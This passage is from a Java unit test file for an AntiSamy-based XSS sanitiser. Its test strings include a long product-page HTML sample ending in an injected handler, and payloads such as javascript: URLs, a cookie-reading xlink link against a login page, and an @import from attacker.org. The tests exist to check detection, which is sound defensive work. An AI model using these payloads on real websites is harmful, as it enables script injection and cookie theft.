                        + "rial, Helvetica, sans-serif;\">ower source</span></span></td><td style=\"width:68px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">H</span></span><span style=\"f\n"
                        + "ont-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">eating method</span></span></td><td style=\"width:79px;\"><span style=\"font-size:12px;\"><span style=\"font-fa\n"
                        + "mily:Calibri;\">O</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">perating temperature</span></span></td><td style=\"width:65px;\">\n"
                        + "<span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ize of bakin\n"
                        + "g pan</span></span></td><td style=\"width:70px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">C</span></span><span style=\"font-size:12px;\"><span style=\"font-f\n"
                        + "amily:Arial, Helvetica, sans-serif;\">ontrol system</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span\n"
                        + " style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">team pressure</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style\n"
                        + "=\"font-family:Calibri;\">W</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">eight</span></span><span style=\"font-size:12px;\"><spa\n"
                        + "n style=\"font-family:Arial, Helvetica, sans-serif;\">/kg</span></span>&nbsp;</td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helv\n"
                        + "etica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span sty\n"
                        + "le=\"font-family:Arial, Helvetica, sans-serif;\">-24</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"\n"
                        + ">1400*1400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1</span></span></td><td style=\"wi\n"
                        + "dth:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">24</span></span></td><td rowspan=\"6\" style=\"width:65px;\"><span style=\"font-size\n"
                        + ":12px;\"><span style=\"font-family:Calibri;\">C</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ustomize</span></span><br />&nbsp;<\n"
                        + "/td><td rowspan=\"6\" style=\"width:68px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">S</span></span><span style=\"font-size:12px;\"><span style=\"font-family:\n"
                        + "Arial, Helvetica, sans-serif;\">team heating or electrical heating</span></span></td><td rowspan=\"6\" style=\"width:79px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Ari\n"
                        + "al, Helvetica, sans-serif;\">0-</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">3</span></span><span style=\"font-size:12px;\"><spa\n"
                        + "n style=\"font-family:Arial, Helvetica, sans-serif;\">00<span style=\"font-family:Arial, Helvetica, sans-serif;\">&ordm;C</span></span></span></td><td rowspan=\"6\" style=\"width:65px;\"\n"
                        + "><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">64</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, san\n"
                        + "s-serif;\">0*</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">46</span></span><span style=\"font-size:12px;\"><span style=\"font-fa\n"
                        + "mily:Arial, Helvetica, sans-serif;\">0*45mm</span></span></td><td rowspan=\"6\" style=\"width:70px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">A</span></span>\n"
                        + "<span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">utomatic control</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><s\n"
                        + "pan style=\"font-family:Arial, Helvetica, sans-serif;\">10.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Ari\n"
                        + "al, Helvetica, sans-serif;\">500</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</spa\n"
                        + "n></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helveti\n"
                        + "ca, sans-serif;\">-48</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1400*2400*2600mm</span></span>\n"
                        + "</td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">2</span></span></td><td style=\"width:65px;\"><span style=\"font-\n"
                        + "size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">48</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, He\n"
                        + "lvetica, sans-serif;\">11.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">8</s\n"
                        + "pan></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\n"
                        + "\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><\n"
                        + "span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-96</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"fon\n"
                        + "t-family:Arial, Helvetica, sans-serif;\">2400*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-ser\n"
                        + "if;\">4</span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">96</span></span></td><td style=\"width:153px\n"
                        + ";\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">12.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size\n"
                        + ":12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">1</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">0</span></span\n"
                        + "><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span s\n"
                        + "tyle=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style\n"
                        + "=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-144</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:\n"
                        + "Arial, Helvetica, sans-serif;\">3500*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">6</\n"
                        + "span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">144</span></span></td><td style=\"width:153px;\"><spa\n"
                        + "n style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">13.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"\n"
                        + "><span style=\"font-family:Arial, Helvetica, sans-serif;\">15</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td>\n"
                        + "</tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span styl\n"
                        + "e=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">-192</span></span></td><td style=\n"
                        + "\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">4500*2400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-\n"
                        + "size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">8</span></span></td><td style=\"width:65px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helv\n"
                        + "etica, sans-serif;\">192</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">14.0.2-0.8Mpa(2-8kg/com)</\n"
                        + "span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">20</span></span><span style=\"font-size:12px;\"><span\n"
                        + " style=\"font-family:Arial, Helvetica, sans-serif;\">00</span></span></td></tr><tr><td style=\"width:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, s\n"
                        + "ans-serif;\">MC-HG</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">F</span></span><span style=\"font-size:12px;\"><span style=\"fon\n"
                        + "t-family:Arial, Helvetica, sans-serif;\">-288</span></span></td><td style=\"width:72px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">5500*2\n"
                        + "400*2600mm</span></span></td><td style=\"width:38px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">12</span></span></td><td style=\"width:65\n"
                        + "px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">288</span></span></td><td style=\"width:153px;\"><span style=\"font-size:12px;\"><span sty\n"
                        + "le=\"font-family:Arial, Helvetica, sans-serif;\">15.0.2-0.8Mpa(2-8kg/com)</span></span></td><td style=\"width:51px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Hel\n"
                        + "vetica, sans-serif;\">280</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">0</span></span></td></tr><tr><td style=\"height:33px;widt\n"
                        + "h:55px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">N</span></span><span style=\"font-size:12px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">ot\n"
                        + "e </span></span></td><td colspan=\"10\" style=\"height:33px;width:725px;\"><span style=\"font-size:12px;\"><span style=\"font-family:Calibri;\">W</span></span><span style=\"font-size:12p\n"
                        + "x;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\">e can design the equipments depend on the requirements</span></span></td></tr></tbody></table><br /><br /><br /><strong><sp\n"
                        + "an style=\"color:#6600cc;\">CHARACTERISTIC</span><br />1. Heating sources include steam, electricity, far infrared, dual-use of steam and electricity, all for users to choose;<br />2. Us\n"
                        + "ing temperature: steam heating 50 ~ 140&ordm;C, the highest 150&ordm;C;<br />3. Electricity, far infrared temperature 50 ~ 350&ordm;C;<br />4. It is equipped with automatic control syste\n"
                        + "m and computer control system for users to choose;<br />5. Commonly used steam pressure 0.02-0.8Mpa (0.2 ~ 8kg / m2);<br />6. It is equipped with electric heating, valued 15KW calculated\n"
                        + " according to type I, practical 5-8kw / h;<br />7. If there is any special requirement please specify in order.<br />Price of non-standard oven is negotiable.<br />Please specify in orde\n"
                        + "r if using temperature is more than 140&ordm;C or less than 60&ordm;C.<br />Our baking car and baking tray are in uniform size, so they are interchangeable;<br />Baking tray size: 640 &t\n"
                        + "imes; 460 &times; 45 (mm)</strong><br /><br /><img srcid=\"112133842\" /><br /><br /><span style=\"font-size:14px;\"><u><span style=\"color:#006600;\"><strong><strong><span style=\"font-\n"
                        + "family:Arial, Helvetica, sans-serif;\">&nbsp;Details for dryer</span></strong></strong></span></u><br /><strong><strong><span style=\"color:#000000;\"><span style=\"font-family:Arial, He\n"
                        + "lvetica, sans-serif;\">&nbsp; This equipment is mainly used in drying</span></span></strong></strong>&nbsp;<strong><strong><span style=\"color:#000000;\"><span style=\"font-family:Arial,\n"
                        + " Helvetica, sans-serif;\">vegetables, fruit, seafood, flowers, such as ginseng, red ginseng, ginseng, angelica, cordyceps sinensis, honeysuckle, conventional, schisandra, astragalus and \n"
                        + "konjac, yam, maize seed, tobacco seeds, pumpkin, onion, spinach, brake, wild, carrots, celery, cowpea, chili, beans, tomatoes, mushrooms, mushrooms, agaric, garlic, ginger, raisins, kiwi\n"
                        + " fruit, banana, litchi, longan, apple, hawthorn, persimmon, scallops, dried fish, kelp, vinasse, chrysanthemum, rose dry food processing, etc.&nbsp;</span></span></strong></strong></span\n"
                        + "><br /><br /><img srcid=\"112133852\" /><br /><br /><br /><span style=\"font-size:14px;\"><span style=\"font-family:Arial, Helvetica, sans-serif;\"><u><strong><span style=\"color:#006600\n"
                        + ";\">Features of dryer &nbsp;:</span></strong></u><br /><br /><span style=\"color:#000000;\">1, vegetable drier , high thermal efficiency, save energy.</span><br /><span style=\"color:#00\n"
                        + "0000;\">2, the use of forced ventilation effect, and equips with adjustable air distributing plate, uniform material drying,&nbsp;Heat source can use steam, hot water, electricity, far i\n"
                        + "nfrared, choose widely.</span><br /><span style=\"color:#000000;\">3, low noise, running balance.Temperature control, easy installation and maintenance.</span></span></span><br /><br /><\n"
                        + "br /><br /><span style=\"font-size:20px;\"><strong>&nbsp;</strong></span><br /><span style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>Service:<br />pre-sale service</stro\n"
                        + "ng></span></span><br /><strong>We Invite customers to visit our company and communicate on technical requirements face to face.<br />sale service<br />Responsible for debugging the equip\n"
                        + "ment according to customers' requirements of various technical data. Our engineers will train our customers about equipment features and operation key points to make sure the equipment r\n"
                        + "unning in the best condition.</strong><br /><br /><span style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>After-sale service</strong></span></span><br /><strong>We provide\n"
                        + " installation, debugging, maintenance, training and other services; Provide relevant technical data, equipment, software and related GMP certification materials;Set up after-sales servic\n"
                        + "e hotline, and arrange personnel to visit customers every year to know more customer needs,like customer operation problems in the process of production equipment.</strong><br /><br /><s\n"
                        + "pan style=\"color:#006600;\"><span style=\"font-size:20px;\"><strong>Quality promise</strong></span></span><br /><strong>Our company promises strictly operate the ISO9001 quality system \n"
                        + "certification standards and pharmaceutical equipment GMP audit requirements,promise we provide new equipment. Advanced technology,good quality.Equipment operation safe reliable, affordab\n"
                        + "le, easy to maintain.<br />Equipment warranty period is one year,all the parts for the equipment choose well-known brand.<br />During the warranty when equipment have problem in quality \n"
                        + "like equipment failure and damage,the company for free maintenance or replacement.</strong><br /><br /><span style=\"color:#990099;\"><span style=\"font-size:24px;\"><strong>&nbsp; We lo\n"
                        + "ok forward to cooperating with partners from all over the world to build win-win cooperation relationship in long term. Welcome for your visiting.</strong></span></span><br /><br /><span\n"
                        + " style=\"font-size:24px;\"><strong><span style=\"font-family:Arial, Helvetica, sans-serif;\"><img srcid=\"112133862\" /></span></strong></span>\" sadads &quot;&gt;&lt;textarea autofocus onfocus=&quot;alert(1) &gt;sdad ";
        Assert.assertFalse(testXssWithAttr(content));
    }

    @Test
    public void testXss12() throws Exception {
        String content = "asd<style>@import url(\"http://attacker.org/malicious.css\");</style>";
        Assert.assertTrue(testXssWithAttr(content));

        content = "<img STYLE=\"background-image:url(javascript:alert(1))\">";
        Assert.assertTrue(testXssWithAttr(content));
        content = "\" sda> asd<style>@import url(\"http://attacker.org/malicious.css\");</style>";
        Assert.assertTrue(testXssWithAttr(content));

    }

    @Test
    public void testXss13() throws Exception {
        String content = "<math href=\"javascript:javascript:alert(1)\">CLICKME</math>";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testXss14() throws Exception {
        String content = "<? foo=\"><script>javascript:alert%281%29</script>\">";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testXss15() throws Exception {
        String content = "https://sa.made-in-china.com/tag_search_product/Pump_hhn_1.html?' onmouseover='alert(9945)' bad='";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testXss16() throws Exception {
        String content = "https://login.made-in-china.com/?errorTitle=.&errorDesc=<math><link xlink:href=javascript:alert(document.cookie)><button class=\"btn btn-main\" id=\"sign-in-submit\" tabindex=\"5\" type=\"submit\">XSS</button>";
        Assert.assertTrue(testXssWithAttr(content));
    }

    @Test
    public void testPattern() throws Exception {
        Pattern pattern = Pattern.compile(".*", Pattern.DOTALL);
        Assert.assertTrue(pattern.matcher("按 按住 Ctrl 并单击 跟随链接\n" + "mailto:glasshm@hotmail.com").matches());
    }

    private boolean testXss(String content) throws PolicyException {
        Policy policy = Policy.getInstance(this.getClass().getResourceAsStream("/antixss.xml"));
        Locale defaultLocal = Locale.getDefault();
        Locale.setDefault(Locale.ENGLISH);
        AntiSamyExt as = new AntiSamyExt();
        try {
            CleanResults cr = as.scan(content, policy);
            System.out.println(cr.getNumberOfErrors());
            System.out.println(cr.getCleanHTML());
            return cr.getNumberOfErrors() > 0;
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        finally {
            Locale.setDefault(defaultLocal);
        }
        return false;
    }

    private boolean testXssWithAttr(String content) throws PolicyException {
        Policy policy = Policy.getInstance(this.getClass().getResourceAsStream("/antixss.xml"));
        Locale defaultLocal = Locale.getDefault();
        Locale.setDefault(Locale.ENGLISH);
        AntiSamyExt as = new AntiSamyExt();
        try {
            CleanResults cr = as.scan(content, policy, true);
            System.out.println(cr.getNumberOfErrors());
            System.out.println(cr.getCleanHTML());
            return cr.getNumberOfErrors() > 0;
        }
        catch (Exception ex) {
            ex.printStackTrace();
        }
        finally {
            Locale.setDefault(defaultLocal);
        }
        return false;
    }

    private String getclean(String content) throws PolicyException {
        Policy policy = Policy.getInstance(this.getClass().getResourceAsStream("/antixss.xml"));
        Locale defaultLocal = Locale.getDefault();
        Locale.setDefault(Locale.ENGLISH);
        AntiSamyExt as = new AntiSamyExt();
        try {
            CleanResults cr = as.scan(content, policy);
            System.out.println(cr.getNumberOfErrors());
            System.out.println(cr.getCleanHTML());
            return cr.getCleanHTML();
        }
        catch (Exception ex) {
        }
        finally {
            Locale.setDefault(defaultLocal);
        }
        return content;
    }

}
